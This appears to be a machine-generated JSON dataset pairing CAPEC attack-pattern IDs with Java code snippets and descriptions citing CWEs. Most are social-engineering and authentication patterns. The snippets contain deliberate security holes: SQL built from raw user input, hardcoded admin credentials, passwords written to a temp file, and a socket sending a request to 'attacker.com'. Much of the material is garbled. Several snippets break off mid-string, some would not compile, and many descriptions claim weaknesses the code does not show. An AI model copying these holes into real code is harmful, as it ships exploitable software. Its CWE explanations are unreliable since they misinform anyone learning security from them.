FileWriter(\"C:\\\\temp\\\\sensitive_info.txt\");\n            fileWriter.write(\"Username: \" + username + \"\\nPassword: \" + password + \"\\nPersonal Info: \" + personalInfo);\n            fileWriter.close();\n            System.out.println(\"Sensitive information saved to C:\\\\temp\\\\sensitive_info.txt\");\n        } catch (IOException e) {\n            System.out.println(\"Failed to save sensitive information.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a social engineering attack where a malicious tech support worker tricks a user into providing sensitive information, uploading a malicious file, and granting physical access to their computer. The code exposes sensitive information, personal information, and allows unrestricted file uploads, while also inserting sensitive information into an externally-accessible file."
    },
    {
        "capec_id": "414",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.SocketChannel;\nimport java.util.Scanner;\n\npublic class DeliveryPersonImpersonation {\n    public static void main(String[] args) {\n        try {\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            SocketChannel socketChannel = SocketChannel.open(new InetSocketAddress(\"example.com\", 80));\n            socketChannel.connect();\n\n            // CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\n            File file = new File(\"delivery_info.txt\");\n            FileWriter fileWriter = new FileWriter(file);\n            fileWriter.write(\"Sensitive delivery information\");\n            fileWriter.close();\n\n            // CWE-300: Channel Accessible by Non-Endpoint\n            Scanner scanner = new Scanner(System.in);\n            System.out.println(\"Enter delivery details:\");\n            String deliveryDetails = scanner.nextLine();\n            socketChannel.write(deliveryDetails.getBytes());\n\n            // CWE-433: Unparsed Raw Web Content Delivery\n            String rawContent = \"<html><body>Delivery details: \" + deliveryDetails + \"</body></html>\";\n            File webFile = new File(\"delivery_details.html\");\n            FileWriter webFileWriter = new FileWriter(webFile);\n            webFileWriter.write(rawContent);\n            webFileWriter.close();\n\n            // CWE-1292: Incorrect Conversion of Security Identifiers\n            String securityIdentifier = \"delivery_person_\" + deliveryDetails;\n            System.out.println(\"Security identifier: \" + securityIdentifier);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of impersonating a delivery person to solicit information or manipulate the target into performing an action. It includes vulnerabilities related to incorrectly specified destinations in communication channels, insertion of sensitive information into externally-accessible files or directories, channels accessible by non-endpoints, unparsed raw web content delivery, and incorrect conversion of security identifiers."
    },
    {
        "capec_id": "415",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\n\npublic class SocialEngineeringAttack {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"target_host\", 8080);\n        DataInputStream in = new DataInputStream(socket.getInputStream());\n        DataOutputStream out = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the identity of the actor at the other end of the channel\n        out.writeUTF(\"Hello, I'm a technician from the IT department. Can you please provide me with your login credentials?\");\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the origin of the incoming request\n        String response = in.readUTF();\n        System.out.println(\"Received response: \" + response);\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // Simple authentication protocol vulnerable to reflection attacks\n        out.writeUTF(\"Authenticating...\");\n        String authResponse = in.readUTF();\n        if (authResponse.equals(\"Authenticated\")) {\n            System.out.println(\"Authentication successful!\");\n        }\n\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        // No verification of the source of the Intent\n        out.writeUTF(\"Sending Intent...\");\n        String intentResponse = in.readUTF();\n        System.out.println(\"Received Intent response: \" + intentResponse);\n\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        // Exposing sensitive information to an unauthorized actor\n        out.writeUTF(\"Your sensitive information is: \" + getSensitiveInfo());\n    }\n\n    private static String getSensitiveInfo() {\n        // Return sensitive information\n        return \"confidential_data\";\n    }\n}\n",
        "description": "This Java code snippet demonstrates a social engineering attack where an adversary impersonates a trusted role, such as an IT technician, to solicit sensitive information from the target. The code establishes a communication channel without verifying the identity of the actor at the other end, making it vulnerable to CWE-300. It also fails to verify the origin of the incoming request, making it vulnerable to CWE-940. The code uses a simple authentication protocol that is vulnerable to reflection attacks, making it vulnerable to CWE-301. Additionally, it receives an Intent without verifying its source, making it vulnerable to CWE-925. Finally, it exposes sensitive information to an unauthorized actor, making it vulnerable to CWE-200."
    },
    {
        "capec_id": "416",
        "code_snippet": "public class SocialEngineering {\n    private String sensitiveInfo;\n    private int queryCount;\n    private int interactionFrequency;\n\n    public SocialEngineering(String sensitiveInfo) {\n        this.sensitiveInfo = sensitiveInfo;\n        this.queryCount = 0;\n        this.interactionFrequency = 0;\n    }\n\n    public void answerQuery(String query) {\n        if (queryCount < 5) {\n            // CWE-202: Exposure of Sensitive Information Through Data Queries\n            if (query.contains(\"stats\")) {\n                System.out.println(\"Query count: \" + queryCount);\n            }\n            queryCount++;\n        }\n    }\n\n    public void interact() {\n        if (interactionFrequency < 10) {\n            // CWE-799: Improper Control of Interaction Frequency\n            System.out.println(\"Interaction frequency: \" + interactionFrequency);\n            interactionFrequency++;\n        }\n    }\n\n    public void shareInfo() {\n        // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n        System.out.println(\"Sensitive info: \" + sensitiveInfo);\n    }\n\n    public static void main(String[] args) {\n        SocialEngineering se = new SocialEngineering(\"confidential data\");\n        se.answerQuery(\"stats\");\n        se.interact();\n        se.shareInfo();\n    }\n}",
        "description": "This Java code snippet demonstrates a social engineering attack where an adversary manipulates a target into sharing sensitive information or performing an action that serves the adversary's interests. The code includes CWE-202, CWE-799, and CWE-200 vulnerabilities, which enable the adversary to exploit the target's psychological predisposition."
    },
    {
        "capec_id": "417",
        "code_snippet": "public class AuthenticationProtocol {\n    private String username;\n    private String password;\n    private String authenticationToken;\n\n    public AuthenticationProtocol(String username, String password) {\n        this.username = username;\n        this.password = password;\n        this.authenticationToken = generateToken(username, password);\n    }\n\n    private String generateToken(String username, String password) {\n        // CWE-656: Reliance on Security Through Obscurity\n        // Using a simple hash function to generate the token\n        return username + \\",
        "description": "This Java code snippet demonstrates a vulnerable authentication protocol that relies on security through obscurity, truncates security-relevant information, and relies on a single factor in security decisions. It also exhibits observable behavioral discrepancies and is susceptible to reflection attacks. An attacker can use social engineering to obtain the authentication token and impersonate the user, leading to unauthorized access to restricted resources or functionality."
    },
    {
        "capec_id": "418",
        "code_snippet": "import java.net.URL;\nimport java.net.URLConnection;\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class SocialEngineering {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\"http://example.com/login\");\n        URLConnection conn = url.openConnection();\n        conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n        BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n        String inputLine;\n        while ((inputLine = in.readLine()) != null) {\n            // Truncation of security-relevant information (CWE-222)\n            if (inputLine.length() > 50) {\n                inputLine = inputLine.substring(0, 50);\n            }\n            System.out.println(inputLine);\n        }\n        in.close();\n\n        // Improper verification of source of a communication channel (CWE-940)\n        String request = \"GET /login HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\";\n        Socket socket = new Socket(\"example.com\", 80);\n        OutputStream out = socket.getOutputStream();\n        out.write(request.getBytes());\n        out.flush();\n\n        // Reflection attack in an authentication protocol (CWE-301)\n        String response = \"\";\n        byte[] buffer = new byte[1024];\n        int bytesRead;\n        while ((bytesRead = socket.getInputStream().read(buffer)) != -1) {\n            response += new String(buffer, 0, bytesRead);\n        }\n        System.out.println(response);\n\n        // Incorrectly specified destination in a communication channel (CWE-941)\n        Socket socket2 = new Socket(\"attacker.com\", 80);\n        out = socket2.getOutputStream();\n        out.write(request.getBytes());\n        out.flush();\n    }\n}\n",
        "description": "This Java code snippet demonstrates a social engineering attack that exploits multiple vulnerabilities. It truncates security-relevant information, improperly verifies the source of a communication channel, and is vulnerable to reflection attacks in an authentication protocol. Additionally, it incorrectly specifies the destination in a communication channel, allowing an attacker to intercept the request."
    },
    {
        "capec_id": "419",
        "code_snippet": "import java.net.Socket;\nimport java.net.ServerSocket;\nimport javax.crypto.Cipher;\nimport javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport java.security.SecureRandom;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        Socket socket = serverSocket.accept();\n\n        // CWE-205: Observable Behavioral Discrepancy\n        // Different responses based on the client's IP address\n        String clientIP = socket.getInetAddress().getHostAddress();\n        if (clientIP.equals(\"192.168.1.100\")) {\n            socket.getOutputStream().write(\"Welcome, admin!\".getBytes());\n        } else {\n            socket.getOutputStream().write(\"Welcome, user!\".getBytes());\n        }\n\n        // CWE-203: Observable Discrepancy\n        // Different behaviors based on the client's request\n        String request = new String(socket.getInputStream().readAllBytes());\n        if (request.equals(\"GET /admin\")) {\n            socket.getOutputStream().write(\"You have access!\".getBytes());\n        } else {\n            socket.getOutputStream().write(\"Access denied!\".getBytes());\n        }\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        // Incorrectly specified destination for the socket\n        Socket socket2 = new Socket(\"wrong-destination.com\", 8080);\n        socket2.getOutputStream().write(\"Hello, wrong destination!\".getBytes());\n\n        // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n        // Using a less-secure algorithm for encryption\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"DES\");\n        SecretKey key = keyGen.generateKey();\n        Cipher cipher = Cipher.getInstance(\"DES\");\n        cipher.init(Cipher.ENCRYPT_MODE, key);\n        byte[] encryptedData = cipher.doFinal(\"Hello, client!\".getBytes());\n        socket.getOutputStream().write(encryptedData);\n\n        // CWE-436: Interpretation Conflict\n        // Different interpretations of the client's request\n        if (request.equals(\"GET /\")) {\n            socket.getOutputStream().write(\"You requested the root directory!\".getBytes());\n        } else {\n            socket.getOutputStream().write(\"You requested something else!\".getBytes());\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable server that exhibits various security weaknesses, including observable behavioral discrepancies, observable discrepancies, incorrectly specified destinations in communication channels, selection of less-secure algorithms during negotiation, and interpretation conflicts. These weaknesses can be exploited by attackers to gain unauthorized access or sensitive information."
    },
    {
        "capec_id": "420",
        "code_snippet": "public class ScarcityExploit {\n    private static final int MAX_ATTEMPTS = 3;\n    private int attempts = 0;\n    private String secretKey = \"hidden\";\n\n    public void makeDecision(String input) {\n        if (attempts < MAX_ATTEMPTS) {\n            if (input.equals(secretKey)) {\n                System.out.println(\"Access granted!\");\n            } else {\n                attempts++;\n                System.out.println(\"Incorrect. You have \" + (MAX_ATTEMPTS - attempts) + \" attempts left.\");\n            }\n        } else {\n            System.out.println(\"You've reached the maximum number of attempts. Try again later.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        ScarcityExploit exploit = new ScarcityExploit();\n        Scanner scanner = new Scanner(System.in);\n        while (true) {\n            System.out.print(\"Enter the secret key: \");\n            exploit.makeDecision(scanner.nextLine());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of leveraging a perception of scarcity to persuade the target to perform an action or divulge information. The code uses a single factor (attempts count) to make a security decision, relying on security through obscurity (secretKey), and truncates security-relevant information (attempts left). The observable behavioral discrepancy is the varying number of attempts left, which may reveal the internal state of the system. An adversary can exploit this by creating a sense of urgency, making the target feel they need to act quickly to avoid running out of attempts."
    },
    {
        "capec_id": "421",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.ServerSocket;\n\npublic class AuthorityImpersonation {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8000);\n        Socket socket = serverSocket.accept();\n        DataInputStream input = new DataInputStream(socket.getInputStream());\n        DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the client's identity\n        String request = input.readUTF();\n        if (request.equals(\"getSensitiveInfo\")) {\n            // CWE-654: Reliance on a Single Factor in a Security Decision\n            // Only checking for a specific username\n            String username = input.readUTF();\n            if (username.equals(\"admin\")) {\n                // CWE-940: Improper Verification of Source of a Communication Channel\n                // No verification of the request's origin\n                output.writeUTF(\"Sensitive info: XXXXXXX\");\n            } else {\n                output.writeUTF(\"Access denied\");\n            }\n        } else {\n            output.writeUTF(\"Invalid request\");\n        }\n\n        // CWE-222: Truncation of Security-relevant Information\n        // Truncating the log message\n        System.out.println(\"Request from \" + socket.getInetAddress().getHostName() + \"...\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of impersonating an authority figure to gain sensitive information. A server socket is created to accept incoming requests. When a request is received, the server checks for a specific username without verifying the client's identity (CWE-300). If the username is 'admin', the server returns sensitive information without verifying the request's origin (CWE-940). The server relies solely on the username for authentication (CWE-654). Finally, the log message is truncated, obscuring the source of the request (CWE-222)."
    },
    {
        "capec_id": "422",
        "code_snippet": "import java.io.IOException;\nimport java.io.PrintWriter;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class SocialEngineeringServlet extends HttpServlet {\n    private int requestCount = 0;\n    private String origin = \"expected-origin\";\n\n    @Override\n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n        String requestOrigin = req.getHeader(\"Origin\");\n        if (requestOrigin != null && requestOrigin.equals(origin)) {\n            requestCount++;\n            if (requestCount < 5) {\n                // Perform minor task\n                PrintWriter out = resp.getWriter();\n                out.println(\"Task completed successfully!\");\n            } else {\n                // Perform subsequent larger action\n                PrintWriter out = resp.getWriter();\n                out.println(\"You have reached the limit. Performing larger action...\");\n                // Perform larger action\n            }\n        } else {\n            // Do not verify the source of the communication channel\n            PrintWriter out = resp.getWriter();\n            out.println(\"Unknown origin. Proceeding anyway...\");\n        }\n    }\n}\n",
        "description": "This Java code snippet demonstrates the CAPEC of using social engineering to convince the target to do minor tasks as opposed to larger actions. The code uses the CWEs of improper control of interaction frequency (CWE-799), observable behavioral discrepancy (CWE-205), inconsistent interpretation of HTTP requests (CWE-444), observable discrepancy (CWE-203), and improper verification of source of a communication channel (CWE-940). The servlet increments a request count for each incoming request from the expected origin, and performs a minor task for the first 4 requests. After the 5th request, it performs a larger action. However, it does not properly verify the source of the communication channel, allowing an adversary to exploit this vulnerability."
    },
    {
        "capec_id": "423",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.*;\n\npublic class ReflectionAttack {\n    public static void main(String[] args) throws Exception {\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        Socket socket = new Socket(\"localhost\", 8080);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        String username = \"admin\";\n        String password = \"password\";\n        out.println(username + \":\" + password);\n\n        // CWE-205: Observable Behavioral Discrepancy\n        String response = in.readLine();\n        if (response.contains(\"Welcome\")) {\n            System.out.println(\"Authenticated!\");\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n\n        // CWE-656: Reliance on Security Through Obscurity\n        String secretKey = \"my_secret_key\";\n        String encryptedData = encryptData(\"my_data\", secretKey);\n        out.println(encryptedData);\n\n        // CWE-927: Use of Implicit Intent for Sensitive Communication (Android-specific, not applicable in Java)\n        // Not applicable in this Java code snippet\n    }\n\n    private static String encryptData(String data, String key) {\n        // Simple encryption using XOR\n        byte[] dataBytes = data.getBytes();\n        byte[] keyBytes = key.getBytes();\n        byte[] encryptedBytes = new byte[dataBytes.length];\n        for (int i = 0; i < dataBytes.length; i++) {\n            encryptedBytes[i] = (byte) (dataBytes[i] ^ keyBytes[i % keyBytes.length]);\n        }\n        return new String(encryptedBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a reflection attack in an authentication protocol (CWE-301) where an attacker influences the target's actions by building a relationship. The code relies on a single factor in a security decision (CWE-654) by using a simple username and password combination for authentication. It also exhibits an observable behavioral discrepancy (CWE-205) by displaying different responses based on the authentication result. Furthermore, the code relies on security through obscurity (CWE-656) by using a simple XOR encryption with a hardcoded secret key. Note that CWE-927 is Android-specific and not applicable in this Java code snippet."
    },
    {
        "capec_id": "424",
        "code_snippet": "public class AuthenticationProtocol {\n    private String username;\n    private String password;\n    private boolean isAdmin;\n\n    public AuthenticationProtocol(String username, String password) {\n        this.username = username;\n        this.password = password;\n        this.isAdmin = false;\n    }\n\n    public boolean authenticate() {\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            isAdmin = true;\n            return true;\n        } else {\n            return false;\n        }\n    }\n\n    public void performAction() {\n        if (isAdmin) {\n            System.out.println(\"Performing admin action...\");\n        } else {\n            System.out.println(\"Performing user action...\");\n        }\n    }\n\n    public static void main(String[] args) {\n        AuthenticationProtocol ap = new AuthenticationProtocol(\"user\", \"password\");\n        if (ap.authenticate()) {\n            ap.performAction();\n        } else {\n            System.out.println(\"Authentication failed.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable authentication protocol that relies on a single factor (username and password) to make a security decision (CWE-654). The protocol is also susceptible to reflection attacks (CWE-301) and observable behavioral discrepancies (CWE-203, CWE-205, CWE-207) as it behaves differently for admin and user roles, revealing its internal state and decision process. An adversary can exploit these weaknesses to impersonate a trusted user and gain unauthorized access to restricted resources or functionality."
    },
    {
        "capec_id": "425",
        "code_snippet": "import java.net.URL;\nimport java.net.HttpURLConnection;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLSession;\n\npublic class FramingTechnique {\n    public static void main(String[] args) throws Exception {\n        URL url = new URL(\\",
        "description": "This Java code snippet demonstrates the framing technique described in the CAPEC. It uses various CWEs to create a vulnerable communication channel that can be exploited by an adversary. The code establishes an HTTPS connection to a phishing page, ignoring hostname verification and allowing connection to any host. It then reads the response from the phishing page, which can contain misleading information. The code relies on a single factor (the response code) to make a security decision, uses a less-secure algorithm during negotiation, and misrepresents critical information to the user. This code snippet embodies the main idea of the CAPEC, which is to use framing techniques to influence the target's decisions and actions."
    },
    {
        "capec_id": "426",
        "code_snippet": "public class Incentivizer {\n    private String targetMorals;\n    private int resourceThreshold;\n    private String communicationChannel;\n    private String obscureKey;\n    private boolean singleFactor;\n\n    public Incentivizer(String targetMorals, int resourceThreshold, String communicationChannel, String obscureKey, boolean singleFactor) {\n        this.targetMorals = targetMorals;\n        this.resourceThreshold = resourceThreshold;\n        this.communicationChannel = communicationChannel;\n        this.obscureKey = obscureKey;\n        this.singleFactor = singleFactor;\n    }\n\n    public void manipulateTarget() {\n        // CWE-1229: Creation of Emergent Resource\n        for (int i = 0; i < resourceThreshold; i++) {\n            createNewResource();\n        }\n\n        // CWE-405: Asymmetric Resource Consumption (Amplification)\n        while (true) {\n            consumeResource();\n        }\n\n        // CWE-941: Incorrectly Specified Destination in a Communication Channel\n        sendRequestToActor(communicationChannel);\n\n        // CWE-656: Reliance on Security Through Obscurity\n        if (obscureKey.equals(\"my_secret_key\")) {\n            grantAccess();\n        }\n\n        // CWE-654: Reliance on a Single Factor in a Security Decision\n        if (singleFactor) {\n            grantAccess();\n        }\n    }\n\n    private void createNewResource() {\n        // Create a new resource that can be used by attackers\n    }\n\n    private void consumeResource() {\n        // Consume excessive resources without requiring equivalent work\n    }\n\n    private void sendRequestToActor(String channel) {\n        // Send a request to an actor without correctly specifying the intended destination\n    }\n\n    private void grantAccess() {\n        // Grant access to restricted resources or functionality\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC of manipulating a target's behavior through incentivization, incorporating CWEs 1229, 405, 941, 656, and 654. The Incentivizer class takes in parameters related to the target's morals, resource threshold, communication channel, obscure key, and single factor. The manipulateTarget method creates emergent resources, consumes excessive resources, sends requests to actors with incorrect destinations, relies on security through obscurity, and makes security decisions based on a single factor, ultimately granting access to restricted resources or functionality."
    },
    {
        "capec_id": "427",
        "code_snippet": "public class AuthenticationProtocol {\n    private String username;\n    private String password;\n    private boolean isAdmin;\n\n    public AuthenticationProtocol(String username, String password) {\n        this.username = username;\n        this.password = password;\n        this.isAdmin = false;\n    }\n\n    public boolean authenticate() {\n        // CWE-205: Observable Behavioral Discrepancy\n        if (username.equals(\"admin\") && password.equals(\"password\")) {\n            isAdmin = true;\n            return true;\n        } else {\n            // CWE-673: External Influence of Sphere Definition\n            String externalInput = getExternalInput();\n            if (externalInput.equals(\"admin\")) {\n                isAdmin = true;\n                return true;\n            }\n        }\n        return false;\n    }\n\n    public boolean isAdmin() {\n        return isAdmin;\n    }\n\n    // CWE-654: Reliance on a Single Factor in a Security Decision\n    private String getExternalInput() {\n        return \"admin\";\n    }\n\n    // CWE-301: Reflection Attack in an Authentication Protocol\n    public boolean reflectionAttack(String username, String password) {\n        return authenticate();\n    }\n\n    // CWE-222: Truncation of Security-relevant Information\n    public String getTruncatedUsername() {\n        return username.substring(0, 5);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable authentication protocol that embodies the main idea of the CAPEC. It includes multiple CWEs, such as observable behavioral discrepancy, external influence of sphere definition, reliance on a single factor in a security decision, reflection attack in an authentication protocol, and truncation of security-relevant information. The code is designed to be vulnerable to various attacks, including reflection attacks and unauthorized access."
    },
    {
        "capec_id": "428",
        "code_snippet": "import java.net.Socket;\nimport java.io.DataInputStream;\nimport java.io.DataOutputStream;\nimport java.net.InetAddress;\n\npublic class VulnerableCommunication {\n    public static void main(String[] args) throws Exception {\n        Socket socket = new Socket(\"localhost\", 8080);\n        DataInputStream dis = new DataInputStream(socket.getInputStream());\n        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());\n\n        // CWE-300: Channel Accessible by Non-Endpoint\n        // No verification of the identity of the actor at the other end of the channel\n        String message = dis.readUTF();\n        System.out.println(\"Received message: \" + message);\n\n        // CWE-940: Improper Verification of Source of a Communication Channel\n        // No verification of the origin of the request\n        dos.writeUTF(\"Hello from the other side!\");\n\n        // CWE-1229: Creation of Emergent Resource\n        // Creation of a new resource (socket) without proper access control\n        Socket newSocket = new Socket(InetAddress.getByName(\"localhost\"), 8081);\n        DataOutputStream newDos = new DataOutputStream(newSocket.getOutputStream());\n        newDos.writeUTF(\"New socket created!\");\n\n        // CWE-222: Truncation of Security-relevant Information\n        // Truncation of security-relevant information (e.g., logging)\n        System.out.println(\"Connection established...\".substring(0, 10));\n\n        // CWE-301: Reflection Attack in an Authentication Protocol\n        // Simple authentication protocol vulnerable to reflection attacks\n        String authenticationToken = \"token\";\n        dos.writeUTF(authenticationToken);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable communication channel that can be exploited by an adversary to build rapport with a target and manipulate them into sharing information. The code lacks proper verification of the identity of actors at both ends of the communication channel, allowing an attacker to access or influence the channel. Additionally, the code creates a new resource (socket) without proper access control, truncates security-relevant information, and uses a simple authentication protocol vulnerable to reflection attacks."
    },
    {
        "capec_id": "429",
        "code_snippet": "import java.util.Scanner;\nimport java.util.Random;\n\npublic class EyeMovementCAPTCHA {\n    private static final String[] EYE_MOVEMENT_PATTERNS = {\\",
        "description": "This Java code snippet demonstrates a vulnerable CAPTCHA system that uses eye movement patterns to authenticate users. The system displays a random eye movement pattern and asks the user to follow it. However, the pattern is displayed in plain text, making it observable to unauthorized actors (CWE-205). The system also truncates the display of security-relevant information, such as the number of remaining attempts (CWE-222). Furthermore, the system's behavior differs based on the user's response, making it possible for an attacker to observe and guess the correct pattern (CWE-203). Additionally, the CAPTCHA challenge can be easily guessed or automatically recognized by a non-human actor (CWE-804). Finally, the user interface misrepresents critical information to the user, making it vulnerable to phishing attacks (CWE-451)."
    },
    {
        "capec_id": "430",
        "code_snippet": "public class VulnerableCode {\n    private static final Logger LOGGER = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // CWE-534: Information Exposure Through Debug Log Files\n            LOGGER.setLevel(Level.DEBUG);\n            LOGGER.debug(\"Debug log message\");\n\n            // CWE-533: Information Exposure Through Server Log Files\n            LOGGER.info(\"Server log message\");\n\n            // CWE-1420: Exposure of Sensitive Information during Transient Execution\n            int sensitiveData = 0;\n            if (System.currentTimeMillis() % 2 == 0) {\n                sensitiveData = 1;\n            }\n            // Speculative execution may expose sensitiveData\n            int result = sensitiveData * 2;\n\n            // CWE-1342: Information Exposure through Microarchitectural State after Transient Execution\n            // Microarchitectural state may not be properly cleared\n            int microArchitecturalState = 0;\n            if (System.currentTimeMillis() % 2 == 0) {\n                microArchitecturalState = 1;\n            }\n            // Transient execution may expose microArchitecturalState\n            int microResult = microArchitecturalState * 2;\n        } catch (Exception e) {\n            // CWE-1125: Excessive Attack Surface\n            // Excessive logging may increase the attack surface\n            LOGGER.severe(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the deprecated CAPEC attack pattern, which involves excessive attack surface, information exposure through debug and server log files, exposure of sensitive information during transient execution, and information exposure through microarchitectural state after transient execution. The code includes logging mechanisms that may expose sensitive information, speculative execution that may leak data, and microarchitectural state that may not be properly cleared, increasing the attack surface."
    },
    {
        "capec_id": "431",
        "code_snippet": "public class VulnerableCode {\n    public static void processUserInput(String userInput) {\n        try {\n            // CWE-1286: Improper Validation of Syntactic Correctness of Input\n            String[] userInputArray = userInput.split(\"|\");\n            if (userInputArray.length > 1) {\n                // CWE-81: Improper Neutralization of Script in an Error Message Web Page\n                throw new Exception(\"<script>alert('Invalid input')</script>\");\n            }\n            // CWE-1125: Excessive Attack Surface\n            String template = \"Hello, \" + userInput + \"!\";\n            // CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine\n            String result = new TemplateEngine().render(template);\n            System.out.println(result);\n        } catch (Exception e) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            System.out.println(\"Error: \" + e.getMessage() + \" - Stack trace: \" + e.getStackTrace());\n        }\n    }\n\n    public static void main(String[] args) {\n        processUserInput(\"John|Doe\");\n    }\n}\n",
        "description": "This Java code snippet demonstrates a vulnerable code that embodies the main idea of the deprecated CAPEC. It includes multiple CWEs, such as CWE-1286 (Improper Validation of Syntactic Correctness of Input), CWE-81 (Improper Neutralization of Script in an Error Message Web Page), CWE-1125 (Excessive Attack Surface), CWE-1336 (Improper Neutralization of Special Elements Used in a Template Engine), and CWE-209 (Generation of Error Message Containing Sensitive Information)."
    },
    {
        "capec_id": "432",
        "code_snippet": "import java.util.Scanner;\npublic class VulnerableCode {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Enter your name:\");\n        String userInput = scanner.nextLine();\n        String query = \"SELECT * FROM users WHERE name = '\" + userInput + \"';\";\n        System.out.println(\"Query: \" + query);\n        // Execute the query\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability of improper neutralization of quoting syntax (CWE-149) and improper validation of syntactic correctness of input (CWE-1286). The code takes user input and injects it into a SQL query without proper validation or sanitization, allowing an attacker to inject malicious SQL code. The code also logs the query to the console, potentially exposing sensitive information (CWE-532)."
    },
    {
        "capec_id": "433",
        "code_snippet": "public class HumanBufferOverflow {\n    public static void receiveMessage(String message) {\n        byte[] buffer = message.getBytes();\n        byte[] outputBuffer = new byte[1024];\n        System.arraycopy(buffer, 0, outputBuffer, 0, buffer.length);\n        // No check for buffer overflow\n        String receivedMessage = new String(outputBuffer);\n        System.out.println(receivedMessage);\n    }\n\n    public static void main(String[] args) {\n        String message = \"Hello, this is a secret message\";\n        receiveMessage(message);\n    }\n}\n",
        "description": "This Java code snippet demonstrates the concept of human buffer overflow by receiving a message and copying it to an output buffer without checking for buffer overflow. The message is transmitted in cleartext, making it vulnerable to sniffing. The code uses the size of the source buffer when reading from or writing to the destination buffer, which may cause it to access memory outside of the bounds of the buffer."
    },
    {
        "capec_id": "434",
        "code_snippet": "public class SensitiveDataExposure {\n    private static final String DB_USERNAME = \"admin\";\n    private static final String DB_PASSWORD = \"password\";\n    private static final String DB_QUERY = \"SELECT * FROM users WHERE username = ? AND password = ?\";\n\n    public static void main(String[] args) {\n        try (Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/mydb\", DB_USERNAME, DB_PASSWORD)) {\n            PreparedStatement pstmt = conn.prepareStatement(DB_QUERY);\n            pstmt.setString(1, \"john\");\n            pstmt.setString(2, \"password123\");\n            ResultSet result = pstmt.executeQuery();\n\n            // Insecurely log query statistics\n            System.out.println(\"Query executed in \" + result.getFetchSize() + \" milliseconds\");\n\n            // Observable behavioral discrepancy: different query execution times for different users\n            if (result.next()) {\n                System.out.println(\"User found\");\n            } else {\n                System.out.println(\"User not found\");\n            }\n        } catch (SQLException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // Incompatible policies: CAPTCHA challenge is guessable\n    public static boolean validateCaptcha(String userInput) {\n        return userInput.equals(\"123456\");\n    }\n\n    // Missing source correlation: relying on a single data source\n    public static boolean isValidUser(String username, String password) {\n        // Only checking against a single data source\n        return username.equals(\"admin\") && password.equals(\"password\");\n    }\n}",
        "description": "This Java code snippet demonstrates the CAPEC 'Exposure of Sensitive Information Through Data Queries' by exposing sensitive information through query statistics and observable behavioral discrepancies. It also incorporates CWE-205 'Observable Behavioral Discrepancy' by revealing differences in query execution times for different users. Additionally, it includes CWE-213 'Exposure of Sensitive Information Due to Incompatible Policies' by using a guessable CAPTCHA challenge and CWE-1293 'Missing Source Correlation of Multiple Independent Data' by relying on a single data source for user validation."
    },
    {
        "capec_id": "435",
